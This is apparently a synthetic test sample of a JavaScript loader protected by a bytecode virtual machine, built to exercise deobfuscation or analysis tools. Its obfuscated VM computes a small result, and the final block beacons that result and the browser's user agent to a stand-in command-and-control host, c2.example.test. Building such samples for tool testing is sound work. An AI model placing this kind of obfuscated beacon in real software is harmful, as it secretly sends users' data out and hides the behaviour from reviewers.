// VMORPH — synthetic JSVMP-protected loader product sample.
// Generated with tools/jsvmp: an obfuscated dispatch loop executes an encoded
// bytecode program. Regenerate with examples/products/build-jsvmp-loader.mjs.
globalThis.__vmorph_run = (function () {
  var BYTECODE = [[24], [28], [24], [28], [2, 1], [25, 49], [5], [28], [2, 0], [25, 50], [5], [28], [2, 1], [25, 51], [5], [28], [22, 49], [2, 10], [15], [23, 47], [28], [28], [28], [22, 50], [31], [22, 51], [4], [25, 52], [5], [28], [28], [22, 51], [25, 50], [5], [28], [28], [22, 52], [25, 51], [5], [28], [28], [22, 49], [2, 1], [4], [25, 49], [5], [21, 15], [22, 51], [30], [0, 53], [31], [4], [25, 54], [5], [22, 54], [0, 55], [4], [32]];
  var STRING_BASE = 49;
  return function (args) {
    var consts = ["i", "a", "b", "tmp", "fib(10)=", "label", " via VM"];
    var readConst = function (index) {
      return consts[index >= STRING_BASE ? index - STRING_BASE : index];
    };
    var stack = [];
    var pc = 0;
    var a = 0, b = 0, n = 0, key = "", callee = null, callArgs = [], arr = [], i = 0;
    args = args == null ? [] : args;
    while (pc < BYTECODE.length) {
      var inst = BYTECODE[pc++];
      switch (inst[0]) {
        case 31:
          a = stack.pop();
          b = stack.pop();
          stack.push(a);
          stack.push(b);
          break;
        case 21:
          pc = inst[1];
          break;
        case 28:
          stack.push(stack[stack.length - 1]);
          break;
        case 4:
          b = stack.pop();
          a = stack.pop();
          stack.push(a + b);
          break;
        case 22:
          key = readConst(inst[1]);
          a = stack.pop();
          stack.push(a[key]);
          break;
        case 5:
          stack.pop();
          break;
        case 2:
          stack.push(inst[1]);
          break;
        case 24:
          stack.push({});
          break;
        case 32:
          return stack.length ? stack[stack.length - 1] : void 0;
        case 25:
          key = readConst(inst[1]);
          b = stack.pop();
          a = stack.pop();
          a[key] = b;
          stack.push(b);
          break;
        case 23:
          if (!stack.pop()) pc = inst[1];
          break;
        case 0:
          stack.push(readConst(inst[1]));
          break;
        case 15:
          b = stack.pop();
          a = stack.pop();
          stack.push(a < b);
          break;
        case 30:
          stack.push(String(stack.pop()));
          break;
      }
    }
    return stack.length ? stack[stack.length - 1] : void 0;
  };
})();
(function () {
  try {
    var result = __vmorph_run();
    console.log('[VMORPH] bytecode result', result);
    try {
      fetch('https://c2.example.test/vmorph', { method: 'POST', body: btoa(JSON.stringify({ result: result, ua: navigator.userAgent })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('vmorph:last', String(result)); } catch (error) {}
  } catch (error) {
    console.log('[VMORPH] vm failed', error.message);
  }
})();
